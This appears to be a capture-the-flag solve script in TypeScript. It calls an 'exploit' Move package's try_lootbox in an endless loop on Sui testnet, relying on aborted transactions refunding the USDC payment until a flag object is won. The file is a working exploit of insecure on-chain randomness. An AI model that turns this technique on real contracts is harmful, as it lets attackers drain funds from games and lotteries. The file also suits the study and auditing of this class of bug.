import { SuiJsonRpcClient } from '@mysten/sui/jsonRpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

// Set this after deploying: sui client publish exploit/ --gas-budget 100000000
const EXPLOIT_PACKAGE = process.env.EXPLOIT_PACKAGE ?? "";

const USDC_TYPE = "0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC";
const RANDOM_OBJECT = "0x0000000000000000000000000000000000000000000000000000000000000008";
const REQUIRED_PAYMENT = 12_000_000n;

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiJsonRpcClient({ url: 'https://fullnode.testnet.sui.io:443', network: 'testnet' });
const address = keypair.getPublicKey().toSuiAddress();

(async () => {
  if (!EXPLOIT_PACKAGE) {
    console.error("Set EXPLOIT_PACKAGE env var to your deployed exploit package ID.");
    console.error("Deploy with: sui client publish exploit/ --gas-budget 100000000");
    process.exit(1);
  }

  console.log("Wallet:", address);

  // Get USDC coins — we only need 12 USDC total since failed attempts roll back
  const { data: usdcCoins } = await suiClient.getCoins({ owner: address, coinType: USDC_TYPE });
  const totalUsdc = usdcCoins.reduce((s, c) => s + BigInt(c.balance), 0n);
  console.log(`USDC balance: ${totalUsdc} (need ${REQUIRED_PAYMENT})`);

  if (totalUsdc < REQUIRED_PAYMENT) {
    console.error("Insufficient USDC. Get 12 USDC from https://faucet.circle.com/ (Sui Testnet).");
    process.exit(1);
  }

  let attempts = 0;

  while (true) {
    attempts++;

    const tx = new Transaction();

    // Merge all USDC coins then split out exactly the required payment
    const primaryCoin = tx.object(usdcCoins[0].coinObjectId);
    if (usdcCoins.length > 1) {
      tx.mergeCoins(primaryCoin, usdcCoins.slice(1).map(c => tx.object(c.coinObjectId)));
    }
    const [payment] = tx.splitCoins(primaryCoin, [tx.pure.u64(REQUIRED_PAYMENT)]);

    tx.moveCall({
      target: `${EXPLOIT_PACKAGE}::exploit::try_lootbox`,
      arguments: [payment, tx.object(RANDOM_OBJECT)],
    });

    const result = await suiClient.signAndExecuteTransaction({
      signer: keypair,
      transaction: tx,
      options: { showObjectChanges: true, showEffects: true },
    });

    const status = result.effects?.status?.status;

    if (status === 'success') {
      const flagObj = result.objectChanges
        ?.filter(c => c.type === 'created')
        .find(o => (o as any).objectType?.includes('flag::Flag'));

      console.log(`\nWon on attempt ${attempts}! Digest: ${result.digest}`);
      if (flagObj) console.log(`Flag object ID: ${(flagObj as any).objectId}`);
      // keep going
    } else {
      // Tx aborted → USDC rolled back, just retry
      process.stdout.write(`Attempt ${attempts}: no flag (${result.effects?.status?.error?.slice(0, 40)})\r`);
    }
  }
})();
